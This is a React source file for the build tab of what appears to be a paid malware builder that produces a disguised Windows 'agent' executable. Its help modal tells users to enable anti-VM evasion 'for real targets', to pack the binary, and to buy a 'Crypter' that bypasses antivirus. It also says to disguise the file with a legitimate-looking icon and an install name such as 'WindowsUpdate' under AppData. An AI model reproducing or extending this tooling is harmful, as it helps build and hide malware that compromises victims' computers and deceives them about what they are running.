import { useState, useEffect, useRef } from "react";
import { apiStartBuild, apiBuildDownloadUrl, apiUploadIcon } from "../../api/builder";
import { on } from "../../socket/events";
import Button from "../ui/Button";
import InfoModal from "../ui/InfoModal";
import { useAuth } from "../../hooks/useAuth";
import useDragDrop from "../../hooks/useDragDrop";

const buildState = { lines: [], busy: false, filename: null, error: "" };
const buildListeners = new Set();
function notifyBuild() { buildListeners.forEach(fn => fn({ ...buildState, lines: [...buildState.lines] })); }

function Toggle({ checked, onChange, disabled, label }) {
  return (
    <label style={{ display: "flex", alignItems: "center", gap: 8, cursor: disabled ? "default" : "pointer", opacity: disabled ? 0.5 : 1 }}>
      <span onClick={() => !disabled && onChange(!checked)} style={{ display: "inline-flex", alignItems: "center", width: 44, height: 20, borderRadius: 0, background: checked ? "#2a6a2a" : "var(--window-face)", border: "2px solid", borderColor: "var(--edge-dark) var(--edge-light) var(--edge-light) var(--edge-dark)", boxSizing: "border-box", position: "relative", flexShrink: 0, transition: "background 0.1s" }}>
        <span style={{ position: "absolute", left: checked ? 22 : 0, width: 18, height: 16, background: checked ? "#aadaaa" : "var(--window-face)", border: "2px solid", borderColor: "var(--edge-light) var(--edge-dark) var(--edge-dark) var(--edge-light)", transition: "left 0.1s", boxSizing: "border-box" }} />
        <span style={{ position: "absolute", left: checked ? 4 : 22, fontSize: 8, fontWeight: 700, color: checked ? "#aadaaa" : "var(--muted)", userSelect: "none", lineHeight: 1, pointerEvents: "none" }}>
          {checked ? "ON" : "OFF"}
        </span>
      </span>
      <span style={{ fontSize: 11, color: "var(--text)", userSelect: "none" }}>{label}</span>
    </label>
  );
}

function IconDropZone({ busy, iconFile, iconPath, onUpload, onClear }) {
  const { dragging, dragProps } = useDragDrop(
    (files) => {
      const f = files[0];
      if (f && f.name.toLowerCase().endsWith(".ico")) {
        onUpload(f);
      }
    },
    { enabled: !busy }
  );
  const inputRef = useRef(null);

  const borderColor = dragging
    ? "var(--primary)"
    : iconPath
    ? "#3a9a3a"
    : "var(--edge-dark)";

  const bg = dragging
    ? "rgba(var(--primary-rgb, 59 130 246), 0.08)"
    : "var(--input-bg)";

  return (
    <div
      {...dragProps}
      className="bevel-in"
      onClick={() => !busy && inputRef.current?.click()}
      style={{
        background: bg,
        border: `2px dashed ${borderColor}`,
        padding: "10px 12px",
        display: "flex",
        alignItems: "center",
        gap: 8,
        cursor: busy ? "default" : "pointer",
        transition: "border-color 0.15s, background 0.15s",
      }}
    >
      <input
        ref={inputRef}
        type="file"
        accept=".ico"
        style={{ display: "none" }}
        onChange={(e) => {
          const f = e.target.files[0];
          if (f) onUpload(f);
          e.target.value = "";
        }}
        disabled={busy}
      />
      <span style={{ fontSize: 14, opacity: 0.6 }}>{iconPath ? "🖼" : "📎"}</span>
      <span style={{
        fontSize: 11,
        color: iconPath ? "#3a9a3a" : "var(--muted)",
        flex: 1,
        overflow: "hidden",
        textOverflow: "ellipsis",
        whiteSpace: "nowrap",
      }}>
        {iconPath
          ? iconFile
          : dragging
          ? "Drop .ico file here"
          : "Drag & drop .ico or click to browse"}
      </span>
      {iconPath && !busy && (
        <span
          onClick={(e) => { e.stopPropagation(); onClear(); }}
          style={{ fontSize: 11, color: "var(--muted)", cursor: "pointer", padding: "0 4px" }}
          title="Remove icon"
        >
          ✕
        </span>
      )}
    </div>
  );
}

function StatusDot({ status }) {
  const color = status === "building" ? "#f0a500" : status === "done" ? "#3a9a3a" : status === "failed" ? "#c0392b" : "var(--muted)";
  const label = status === "building" ? "building..." : status === "done" ? "ready" : status === "failed" ? "failed" : "idle";
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 10, color: "var(--muted)" }}>
      <span style={{ width: 7, height: 7, borderRadius: "50%", background: color, display: "inline-block", boxShadow: status === "building" ? `0 0 4px ${color}` : "none" }} />
      {label}
    </div>
  );
}

export default function BuildTab() {
  const { user } = useAuth();
  const isPaid = user?.plan === 1 || user?.is_admin;
  const [debug, setDebug] = useState(false);
  const [upx, setUpx] = useState(false);
  const [crypter, setCrypter] = useState(false);
  const [displayName, setDisplayName] = useState("My Agent");
  const [iconPath, setIconPath] = useState("");
  const [iconFile, setIconFile] = useState(null);
  const [showHelp, setShowHelp] = useState(false);
  const [state, setState] = useState({ ...buildState, lines: [...buildState.lines] });
  const bottomRef = useRef(null);

  const status = state.busy ? "building" : state.filename ? "done" : state.error ? "failed" : "idle";

  useEffect(() => {
    const listener = (s) => {
      setState(s);
      setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: "auto" }), 0);
    };
    buildListeners.add(listener);
    const offOutput = on("build_output", (p) => {
      if (!p?.line) return;
      buildState.lines.push(p.line);
      notifyBuild();
    });
    const offDone = on("build_done", (p) => {
      buildState.busy = false;
      if (p?.ok) { buildState.filename = p.filename; buildState.error = ""; }
      else { buildState.error = "build failed"; buildState.filename = null; }
      notifyBuild();
    });
    return () => { buildListeners.delete(listener); offOutput(); offDone(); };
  }, []);

  const startBuild = async () => {
    buildState.busy = true;
    buildState.filename = null;
    buildState.error = "";
    buildState.lines = [];
    notifyBuild();
    try {
      await apiStartBuild(debug, upx, crypter, displayName, iconPath);
    } catch (e) {
      buildState.busy = false;
      buildState.error = e.message;
      notifyBuild();
    }
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
      <div className="bevel-in" style={{ background: "var(--input-bg)", padding: "8px 10px", display: "flex", alignItems: "center", gap: 16, flexWrap: "wrap" }}>
        <Toggle checked={!debug} onChange={(v) => setDebug(!v)} disabled={state.busy} label="Anti-VM" />
        <Toggle checked={upx} onChange={setUpx} disabled={state.busy} label="UPX" />
        {isPaid && (
          <Toggle checked={crypter} onChange={setCrypter} disabled={state.busy} label="Crypter" />
        )}
        {!isPaid && (
          <a href="/settings/plans" style={{ fontSize: 10, color: "var(--primary)", textDecoration: "underline" }}>
            Crypter (paid) -- click to upgrade
          </a>
        )}
        <div style={{ flex: 1 }} />
        <StatusDot status={status} />
        <Button onClick={() => setShowHelp(true)}>?</Button>
      </div>

      {showHelp && (
        <InfoModal title="Build Options" onClose={() => setShowHelp(false)}>
          {[
            {
              label: "Install Name",
              color: "#a0c4ff",
              lines: [
                "Sets both the exe name and installation folder on the target.",
                "e.g. 'WindowsUpdate' → %AppData%\\WindowsUpdate\\WindowsUpdate.exe",
              ],
            },
            {
              label: "Custom Icon",
              color: "#a0c4ff",
              lines: [
                "Upload a .ico file to replace the default binary icon.",
                "Use an icon that matches a legitimate-looking app (e.g. a PDF reader or updater).",
              ],
            },
            {
              label: "Anti-VM",
              color: "#4ecca3",
              lines: [
                "Detects sandbox and VM environments and exits silently if detected.",
                "Turn ON for real targets.",
                "Turn OFF when testing in your own VM.",
              ],
            },
            {
              label: "UPX",
              color: "#4ecca3",
              lines: [
                "Compresses the binary from ~8MB to ~3MB using UPX packing.",
                { text: "Can trigger AV heuristics on some systems.", color: "#e87070" },
              ],
            },
            {
              label: "Crypter",
              color: "#f0a500",
              lines: [
                "Encrypts and obfuscates the binary to bypass signature-based AV detection.",
                { text: "Paid feature — requires an active plan.", color: "#f0a500" },
              ],
            },
          ].map(({ label, color, lines }) => (
            <div key={label} style={{ marginBottom: 14, paddingBottom: 14, borderBottom: "1px solid var(--edge-dark)" }}>
              <div style={{ fontWeight: 700, color, marginBottom: 5, fontSize: 12 }}>{label}</div>
              {lines.map((l, i) => typeof l === "string"
                ? <div key={i}>{l}</div>
                : <div key={i} style={{ color: l.color }}>{l.text}</div>
              )}
            </div>
          ))}
        </InfoModal>
      )}

      <IconDropZone
        busy={state.busy}
        iconFile={iconFile}
        iconPath={iconPath}
        onUpload={async (f) => {
          try {
            const r = await apiUploadIcon(f);
            setIconPath(r.path);
            setIconFile(f.name);
          } catch (err) {
            alert("Upload failed: " + err.message);
            setIconPath("");
            setIconFile(null);
          }
        }}
        onClear={() => { setIconPath(""); setIconFile(null); }}
      />

      <div className="bevel-in" style={{ background: "var(--input-bg)", padding: "6px 10px", display: "flex", alignItems: "center", gap: 8 }}>
        <span style={{ fontSize: 11, color: "var(--muted)", whiteSpace: "nowrap" }}>Install name:</span>
        <input
          type="text"
          value={displayName}
          onChange={(e) => setDisplayName(e.target.value)}
          disabled={state.busy}
          placeholder="My Agent"
          style={{
            flex: 1,
            background: "var(--window-face)",
            border: "2px solid",
            borderColor: "var(--edge-dark) var(--edge-light) var(--edge-light) var(--edge-dark)",
            padding: "3px 6px",
            fontSize: 11,
            color: "var(--text)",
            outline: "none",
            fontFamily: "inherit",
          }}
        />
        <span style={{ fontSize: 10, color: "var(--muted)" }}>.exe</span>
      </div>

      <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
        <Button onClick={startBuild} disabled={state.busy}>
          {state.busy ? "building..." : "▶ Build"}
        </Button>
        {state.filename && (
          <a href={apiBuildDownloadUrl(state.filename)} download={state.filename} style={{ textDecoration: "none" }}>
            <Button>⬇ {state.filename}</Button>
          </a>
        )}
        {state.error && <span style={{ fontSize: 11, color: "#c0392b" }}>{state.error}</span>}
      </div>
      <div
        className="bevel-in vista-scroll"
        style={{ background: "#0c0c0c", color: "#cccccc", fontFamily: "monospace", fontSize: 11, lineHeight: 1.5, padding: "8px 10px", height: 280, overflowY: "auto", whiteSpace: "pre-wrap", wordBreak: "break-all" }}
      >
        {state.lines.length === 0 && <span style={{ color: "#444" }}>output will appear here...</span>}
        {state.lines.map((line, i) => <div key={i}>{line}</div>)}
        <div ref={bottomRef} />
      </div>
    </div>
  );
}